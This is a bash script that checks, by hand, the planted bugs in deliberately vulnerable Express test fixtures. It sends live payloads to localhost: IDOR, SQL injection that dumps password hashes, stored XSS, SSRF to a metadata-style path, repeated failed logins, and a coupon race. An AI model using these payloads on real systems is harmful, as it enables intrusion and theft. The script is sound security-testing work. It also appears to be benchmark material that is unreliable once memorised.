#!/usr/bin/env bash
# Hand-verification script for the Express fixtures (vuln + clean twin).
# Usage: repro-node.sh <port> <internal_port> <logfile>
# Prints what was actually observed for every planted bug. Start the fixture first.
set -uo pipefail
P=${1:?port}; IP=${2:?internal port}; LOG=${3:?log file}
B=http://127.0.0.1:$P
j() { jq -c . 2>/dev/null || cat; }
tok() { curl -s -X POST "$B/login" -H 'content-type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}" | jq -r '.token // empty'; }

echo "== IDOR: alice reads bob's message 2"
A=$(tok alice alice-fixture-pw)
curl -s -o /dev/stderr -w '  http=%{http_code}\n' "$B/api/messages/2" -H "authorization: Bearer $A" 2>&1 | tail -2
echo "== SQLi: UNION dumps password hashes"
curl -s -w '\n  http=%{http_code}\n' -G "$B/api/search" --data-urlencode "q=zzz' UNION SELECT id,username,password_hash FROM users--" | tail -2
echo "== Stored XSS: comment body reflected unescaped"
curl -s -o /dev/null -X POST "$B/api/comments" -H "authorization: Bearer $A" -H 'content-type: application/json' -d '{"body":"<script>alert(1)</script>"}'
curl -s "$B/comments" | grep -o '<li><b>alice</b>: .\{0,40\}' | tail -1
echo "== SSRF: preview of internal-only service on $IP"
curl -s -w '\n  http=%{http_code}\n' -G "$B/api/fetch-preview" --data-urlencode "url=http://127.0.0.1:$IP/latest/meta-data/" -H "authorization: Bearer $A" | tail -2
echo "== Rate limit: 12 bad logins in a row (status codes)"
for i in $(seq 12); do curl -s -o /dev/null -w '%{http_code} ' -X POST "$B/login" -H 'content-type: application/json' -d '{"username":"alice","password":"wrong-guess-'$i'"}'; done; echo
echo "== Password in logs"
grep -c 'wrong-guess-1' "$LOG" | sed 's/^/  log lines containing a submitted password: /'
echo "== Coupon race: 10 concurrent redeems of single-use WELCOME10 as bob"
Bt=$(tok bob bob-fixture-pw)
for i in $(seq 10); do curl -s -o /dev/null -w '%{http_code}\n' -X POST "$B/api/coupons/redeem" -H "authorization: Bearer $Bt" -H 'content-type: application/json' -d '{"code":"WELCOME10"}' & done | sort | uniq -c
wait
echo -n "  bob balance afterwards: "; curl -s "$B/api/me" -H "authorization: Bearer $Bt" | j
